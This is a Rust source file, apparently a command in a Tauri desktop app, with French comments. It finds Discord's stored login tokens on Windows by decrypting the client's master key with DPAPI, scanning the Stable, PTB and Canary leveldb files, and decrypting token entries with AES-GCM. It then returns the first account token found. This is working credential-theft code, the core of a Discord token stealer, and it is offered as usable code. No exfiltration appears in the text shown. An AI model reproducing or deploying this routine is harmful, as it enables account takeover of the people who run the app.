use aes_gcm::{aead::{Aead, KeyInit}, Aes256Gcm, Nonce, Key};
use std::env;
use std::fs;
use std::path::PathBuf;
use std::ptr;
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::wincrypt::CRYPTOAPI_BLOB;
use winapi::um::winbase::LocalFree;
use regex::Regex;
use serde_json::Value;

fn decrypt_dpapi(encrypted_data: &[u8]) -> Result<Vec<u8>, String> {
    let mut data_in = CRYPTOAPI_BLOB {
        cbData: encrypted_data.len() as u32,
        pbData: encrypted_data.as_ptr() as *mut u8,
    };
    let mut data_out = CRYPTOAPI_BLOB {
        cbData: 0,
        pbData: ptr::null_mut(),
    };

    unsafe {
        let success = CryptUnprotectData(
            &mut data_in,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            &mut data_out,
        );

        if success == 0 {
            return Err("Échec du déchiffrement DPAPI".to_string());
        }

        let slice = std::slice::from_raw_parts(data_out.pbData, data_out.cbData as usize);
        let result = slice.to_vec();
        LocalFree(data_out.pbData as *mut _);
        Ok(result)
    }
}

fn get_master_key(discord_path: &PathBuf) -> Result<Vec<u8>, String> {
    let local_state_path = discord_path.join("Local State");
    let local_state_content = fs::read_to_string(local_state_path)
        .map_err(|_| "Impossible de lire le fichier Local State".to_string())?;
    
    let json: Value = serde_json::from_str(&local_state_content)
        .map_err(|_| "Parsing JSON de Local State a échoué".to_string())?;
        
    let encrypted_key_b64 = json["os_crypt"]["encrypted_key"].as_str()
        .ok_or("Clé chiffrée introuvable dans le JSON")?;
        
    use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
    let mut encrypted_key = BASE64.decode(encrypted_key_b64)
        .map_err(|_| "Décodage Base64 a échoué".to_string())?;
        
    // Supprimer le préfixe "DPAPI" (5 octets)
    if encrypted_key.len() < 5 {
        return Err("Clé chiffrée trop courte".to_string());
    }
    encrypted_key = encrypted_key[5..].to_vec();
    
    decrypt_dpapi(&encrypted_key)
}

fn decrypt_aes_gcm(encrypted_token: &[u8], key: &[u8]) -> Result<String, String> {
    if encrypted_token.len() < 15 {
        return Err("Jeton chiffré trop court".to_string());
    }
    
    // Format attendu: v10 (3 octets) + nonce (12 octets) + ciphertext
    let nonce_bytes = &encrypted_token[3..15];
    let ciphertext = &encrypted_token[15..];
    
    let key = Key::<Aes256Gcm>::from_slice(key);
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(nonce_bytes);
    
    match cipher.decrypt(nonce, ciphertext) {
        Ok(decrypted) => String::from_utf8(decrypted).map_err(|_| "Erreur d'encodage UTF-8".to_string()),
        Err(_) => Err("Déchiffrement AES-GCM a échoué".to_string()),
    }
}

#[tauri::command]
pub fn get_discord_token() -> Result<String, String> {
    let appdata = env::var("APPDATA").map_err(|_| "Variable APPDATA introuvable".to_string())?;
    
    // Chemins possibles pour Discord (Stable, PTB, Canary)
    let paths = vec![
        PathBuf::from(&appdata).join("discord"),
        PathBuf::from(&appdata).join("discordptb"),
        PathBuf::from(&appdata).join("discordcanary"),
    ];
    
    use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
    let re = Regex::new(r"dQw4w9WgXcQ:([^\x22]+)").unwrap();
    
    let mut tokens = Vec::new();
    
    for discord_path in paths {
        if !discord_path.exists() {
            continue;
        }
        
        // Obtenir la clé maître pour cette installation de discord
        let master_key = match get_master_key(&discord_path) {
            Ok(k) => k,
            Err(_) => continue, // On passe à l'installation suivante
        };
        
        let leveldb_path = discord_path.join("Local Storage").join("leveldb");
        if !leveldb_path.exists() {
            continue;
        }
        
        if let Ok(entries) = fs::read_dir(leveldb_path) {
            for entry in entries.flatten() {
                let path = entry.path();
                let ext = path.extension().and_then(|s| s.to_str()).unwrap_or("");
                
                if ext == "ldb" || ext == "log" {
                    if let Ok(content) = fs::read_to_string(&path) {
                        for cap in re.captures_iter(&content) {
                            let b64_token = &cap[1];
                            if let Ok(encrypted_token) = BASE64.decode(b64_token) {
                                if let Ok(decrypted) = decrypt_aes_gcm(&encrypted_token, &master_key) {
                                    if !tokens.contains(&decrypted) {
                                        tokens.push(decrypted);
                                    }
                                }
                            }
                        }
                    } else if let Ok(bytes) = fs::read(&path) {
                        // S'il ne peut pas être lu comme UTF-8, essayons au format binaire
                        let content_str = String::from_utf8_lossy(&bytes);
                        for cap in re.captures_iter(&content_str) {
                            let b64_token = &cap[1];
                            if let Ok(encrypted_token) = BASE64.decode(b64_token) {
                                if let Ok(decrypted) = decrypt_aes_gcm(&encrypted_token, &master_key) {
                                    if !tokens.contains(&decrypted) {
                                        tokens.push(decrypted);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    if tokens.is_empty() {
        return Err("Aucun jeton Discord trouvé. Êtes-vous connecté à l'application de bureau ?".to_string());
    }
    
    // On retourne le premier jeton trouvé
    Ok(tokens[0].clone())
}
